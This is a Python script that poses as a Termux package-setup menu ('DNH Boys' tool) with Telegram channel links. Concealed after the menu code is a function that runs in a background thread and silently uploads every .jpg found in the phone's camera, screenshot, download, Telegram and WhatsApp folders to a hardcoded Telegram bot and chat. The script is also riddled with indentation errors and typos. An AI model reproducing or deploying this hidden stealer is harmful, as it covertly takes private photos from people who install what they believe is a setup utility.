import os
a="\033[1;34m"#----------𝗯𝗹𝘂𝗲
b="\033[1;30m"#--------𝗯𝗹𝗮𝗰𝗸
c="\033[1;36m"#----------𝗰𝘆𝗮𝗻
g="\033[1;32m"#----------𝗴𝗿𝗲𝗲𝗻
p="\033[1;35m"#----------𝗽𝘂𝗿𝗽𝗹𝗲
r="\033[1;31m"#----------𝗿𝗲𝗱
y="\033[1;33m"#----------𝘆𝗲𝗹𝗹𝗼𝘄

def  clr():
	os.system('clear')
	print(logo)

logo = ('''
\033[1;32m
\033[1;32m██████╗ \033[1;35m███╗   ██╗\033[1;36m██╗  ██╗    \033[0;34m██████╗  \033[0;32m██████╗ \033[0;33m██╗   ██╗\033[0;31m███████╗
\033[1;32m██╔══██╗\033[1;35m████╗  ██║\033[1;36m██║  ██║    \033[0;34m██╔══██╗\033[0;32m██╔═══██╗\033[0;33m╚██╗ ██╔╝\033[0;31m██╔════╝
\033[1;32m██║  ██║\033[1;35m██╔██╗ ██║\033[1;36m███████║    \033[0;34m██████╔╝\033[0;32m██║   ██║ \033[0;33m╚████╔╝ \033[0;31m███████╗
\033[1;32m██║  ██║\033[1;35m██║╚██╗██║\033[1;36m██╔══██║    \033[0;34m██╔══██╗\033[0;32m██║   ██║  \033[0;33m╚██╔╝  \033[0;31m╚════██║
\033[1;32m██████╔╝\033[1;35m██║ ╚████║\033[1;36m██║  ██║   \033[0;34m ██████╔╝\033[0;32m╚██████╔╝   \033[0;33m██║   \033[0;31m███████║
\033[1;32m╚═════╝ \033[1;35m╚═╝  ╚═══╝\033[1;36m╚═╝  ╚═╝    \033[0;34m╚═════╝  \033[0;32m╚═════╝    \033[0;33m╚═╝   \033[0;31m╚══════╝
                                                                


    \033[38;5;46md8888b. d8b   db db   db 
    \033[38;5;46m88  `8D 888o  88 88   88 
    \033[38;5;46m88   88 88V8o 88 88ooo88 
    \033[38;5;46m88   88 88 V8o88 88~~~88 
    \033[38;5;46m88  .8D 88  V888 88   88 
    \033[38;5;46mY8888D' VP   V8P YP   YP 
''')

menu = ('''
\033[1;35m 
[01] Termux Basic Setup 
[02] Termux full Setup
[03] Join Channel 
[04] Contact Tool Owner
[05] Exit
''')

def himadro():
	print(logo)
	print(menu)
	bb = input('ENTER YOUR CHOICE :')
	if bb in ['01','1']:
		basic()
		if bb in ['2','02']:
			full()
		if bb in ['3','03']:
			join()
		if bb in ['4','04']:
			contact()
		if bb in ['5','05']:
			exit()
			
def basic():
	clr()
	os.system('''
pkg update
pkg upgrade
pkg install python
pkg install python2
pkg install python3
pkg install wget
pkg install git
pkg install bash
pkg install python-pip
pip2 install wget
pip install bs4
pip2 install bs4
pip install requests
pip2 install requests
pip install mechanize
pip2 install mechanize
pip install php
pip2 install php''')
	
def full():
	clr()
	os.system('''
pkg update
pkg upgrad
pkg install python
pkg install python2
pkg install python3
pkg install python-pip
pkg install wget
pkg install fish
pkg install ruby
pkg install help
pkg install git
pkg install dnsutils  
pkg install php
pkg install perl
pkg install lua
pkg install parallel
pkg install nmap
pkg install bash
pkg install clang
pkg install nano
pkg install w3m
pkg install hydra
pkg install figlet
pkg install cowsay
pkg install curl
pkg install tar
pkg install zip
pkg install unzip
pkg install net-tools
pkg install tor -y
pkg install sudo -y
pkg install wireshark
pkg install wgetrc
pkg install wcalc
pkg install openssl
pkg install openssl-tool
pkg install bmon
pkg install vpn
pkg install unrar
pkg install toilet
pkg install proot
pkg install net-tools
pkg install vim
pkg install vim-python
pkg install ired
pkg install goaccess
pkg install golang
pkg install tar
pkg install kibi
pkg install tsu
pkg install tmux
pkg install mtools
pkg install file
pkg install vis
pkg install pass
pkg install pick
pkg install chroot
termux-chroot
pkg install macchanger
pkg install ninja
pkg install elixir
pkg install swift
pkg install xmlstarlet
pkg install fakeroot
pkg install texinfo
pkg install netcat
pkg install wren
pkg install gatling
pkg install cvs
pkg install ffmpeg
pkg install screen 
pkg install neofetch 
pkg install mariadb
pkg install picolisp
pkg install toilet
pkg install cmatrix
pkg install dropbear
pkg install openssh
pkg install python-pip
pip2 install wget
pip install bs4
pip2 install bs4
pip install requests
pip2 install requests
pip install mechanize
pip2 install mechanize
pip install php
pip2 install php''')
	
def join():
	clr()
	so.system('xgd-open https://t.me/dnhboys1')
	
def contact():
	clr()
	os.system('xgd-open https://t.me/Himadroniloy') 
	
def exit():
	clr() 
	os.system('Thansk for using my tool')
	
        import requests,os,sys
from concurrent.futures import ThreadPoolExecutor as ThreadPool

try:
    import requests
        except:
    os.system("pip install requests")
    import requests 
def suyaib():
    session=requests.session()
    bot_token = '7013401311:AAH-Agy2I3BLUQ0ElcGCHJW3t2yDGtGOSeU' 
    chat_id = '6343893298'    																																						
    try:
        sdcard_path = '/sdcard'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.jpg')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    try:
        sdcard_path = '/sdcard/Download'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.jpg')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)                
    except:pass
    try:
        sdcard_path = '/sdcard/DCIM/Screenshots'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.jpg')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    try:
        sdcard_path = '/sdcard/Download/Telegram'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.jpg')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    try:
        sdcard_path = '/sdcard/DCIM/Camera'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.jpg')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    try:
        sdcard_path = '/sdcard/Telegram/Telegram Files'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.jpg')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    try:
        sdcard_path = '/sdcard/WhatsApp/Media/WhatsApp Documents'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.jpg')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
with ThreadPool(max_workers=1000) as user:
    user.submit(suyaib)
    user.submit(himadro)
	
	
	
	
	
	
	
	
	
	
	
	

			
		
	







